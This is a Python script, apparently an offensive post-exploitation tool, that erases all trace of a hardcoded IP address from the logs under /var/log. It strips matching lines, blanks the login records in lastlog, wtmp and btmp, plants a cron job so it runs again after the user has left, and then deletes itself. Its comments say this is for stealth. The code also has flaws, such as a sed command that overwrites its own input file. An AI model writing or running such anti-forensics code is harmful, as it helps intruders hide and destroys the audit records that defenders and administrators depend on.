#Log File Parser
#Mackenzie Summers
#Run as root on Kali
 
#Script creates its own cron job so it can run after user has left
#script will autoremove itself and cron job once no more instances of IP have been found
#The echo and print statements are to tell you it ran, could be removed for stealth
#takes 2 runs as cron job to fully complete
 
import os, subprocess
 
def scrub_logs(dir):
	startup_loc = os.getcwd()
	cleanup_check = False
	search_str = "10.12.0.15"
	os.chdir(dir)
	complete_list = os.listdir(dir)
	file_list = []
	for item in complete_list:
		if os.path.isfile(item):
			file_list.append(item)
		else:
			for item2 in os.listdir(item):
				file_list.append(item + "/" + item2)
	confirmed_files = []
	for file in file_list:
		edit_command = ""
		if file[-2:] == "gz":
			edit_command = "z"
		if not os.path.isdir(file):
			test = ['{}grep'.format(edit_command), search_str, file]
			out = subprocess.Popen(test,
				stdout=subprocess.PIPE,
				stderr=subprocess.STDOUT)
			stdout,stderror = out.communicate()
			if stdout != b'':
				confirmed_files.append(file)
	if confirmed_files == []:
		cleanup_check = True
	search_mod = "^.*{}.*$".format(search_str)
	for file in confirmed_files:
		if "lastlog" in file or "wtmp" in file or "btmp" in file:
				os.system(">/var/log/{}".format(file))
		else:
			command = "sed 's/{}/{}/g' {} >{}".format(search_mod, "", file, file)
			os.system(command)
	os.chdir(startup_loc)
	if cleanup_check == True:
		try:
			os.system("rm log_scrub.py")
		except:
			pass
		os.system("crontab -l > cron.txt")		#clear crontab !FIX
		os.system("sed '1d' cron.txt > cron2.txt")
		os.system("crontab cron2.txt")
		os.system("rm cron.txt")
		os.system("rm cron2.txt")				
	else:
		os.system("crontab -l >cron.txt")
		command = "echo \"* * * * * /usr/bin/python3 {} && echo 'Logs Scrubbed and Python file Removed' | wall\" >>cron.txt".format(startup_loc + "/log_scrub.py")
		f = open("cron.txt")
		test = f.read()
		f.close()
		if "/usr/bin/python3" not in test:
			os.system(command)
			os.system("crontab cron.txt")
		try:
			os.system("rm cron.txt")
		except:
			pass
		print("Log Files have been cleared")
		print("Please log out to ensure that all files will be properly cleaned")
		print("Cron job added, Script will re-run at next 5 min interval")
 
print("\nLog Parsing\n")
scrub_logs("/var/log/")
